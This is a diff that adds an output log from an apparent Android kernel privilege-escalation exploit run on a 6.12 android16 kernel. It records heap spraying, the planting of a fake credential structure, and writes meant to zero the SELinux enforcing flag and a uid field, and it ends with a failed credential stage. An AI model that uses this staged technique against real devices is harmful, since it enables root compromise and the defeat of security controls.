@@ -1,0 +1,50 @@
+PROBE_KERNEL=6.12.23-android16-5-g41f4cb1fa7c7-abogki465038634-4k
+PROBE_TRACE=yes
+PROBE_OK
+[+] pid=12421 cpu=2
+[ids] page_alloc=324 page_free=322 pairs=4
+[base] made=512 best=0xffffff7e6a974000 count=32
+[cred] attempt=0 child=12461 R=0xffffff885f333f00 site_low=0x10bbc0 recs=1 task=0xffffff89d3f89640 task_recs=1
+[+] child=12461 cred=0xffffff885f333f00 target=0xffffff885f333f08
+[+] stage fake_cred target=0xffffff89d3f89f40 mode=fake attempt=1
+[+] plant1 base=0xffffff7f80000000 slabs=65 pfns=64 recs=2048 kept=2048
+[+] plant1 fake cred off=0xf78 blob=0x1f00 sec=0xffffff88e6675f00
+[slab] pre-exec active=4992 total=4992
+[+] plant1 V=0xffffff88e6674f00 A=0xffffff88e6674f78 pfn=0x966674 slab=0x966674 slide=0x1b90600000 recs=2048 slab_own=32/32 base=0xffffff7f80000000
+[+] plant1 target=12476 etid=12520 zombie code=2 status=9
+[churn] n=4096 made=4096
+[dbg] plant1 churn=1 round=1
+[dbg] plant1 spray round=2 (free_seen=1)
+[+] plant1 free_seen=1 burst hit=1 after 275ms
+[+] plant1 reaped status=0x9
+[+] plant1 write mode=fake target=0xffffff89d3f89f40
+[+] fake cred A=0xffffff88e6674f78 selinux_state=0xffffffdc12c79370
+[+] stage selinux target=0xffffffdc12c79369 mode=zero attempt=1
+[+] plant1 base=0xffffff7f80000000 slabs=65 pfns=58 recs=2048 kept=2048
+[slab] pre-exec active=5248 total=5248
+[+] plant1 V=0xffffff8ad83c5000 A=0xffffff8ad83c5078 pfn=0xb583c5 slab=0xb583c4 slide=0x1b90600000 recs=2048 slab_own=32/32 base=0xffffff7f80000000
+[+] plant1 target=12536 etid=12541 zombie code=2 status=9
+[churn] n=4096 made=4096
+[dbg] plant1 churn=1 round=1
+[churn] n=4096 made=4096
+[dbg] plant1 churn=2 round=2
+[dbg] plant1 spray round=3 (free_seen=1)
+[+] plant1 free_seen=1 burst hit=1 after 674ms
+[+] plant1 reaped status=0x9
+[+] plant1 write mode=zero target=0xffffffdc12c79369
+[ksu] panic_on_warn=0
+[+] stage fake_uid target=0xffffff88e6674f80 mode=zero attempt=1
+[+] plant1 base=0xffffff7f80000000 slabs=65 pfns=58 recs=2048 kept=2048
+[slab] pre-exec active=5248 total=5248
+[+] plant1 V=0xffffff8b1b404c00 A=0xffffff8b1b404c78 pfn=0xb9b404 slab=0xb9b404 slide=0x1b90600000 recs=2048 slab_own=32/32 base=0xffffff7f80000000
+[+] plant1 target=12583 etid=12588 zombie code=2 status=9
+[churn] n=4096 made=4096
+[dbg] plant1 churn=1 round=1
+[dbg] plant1 spray round=2 (free_seen=1)
+[+] plant1 free_seen=1 burst hit=1 after 268ms
+[+] plant1 reaped status=0x9
+[+] plant1 write mode=zero target=0xffffff88e6674f80
+[+] cred writes landed, waking child
+[!] child report missing (n=0 wait=12461 status=0)
+FAIL=cred REASON=cred T=2867ms
+FAIL_EXIT=cred holder=t61269-hold
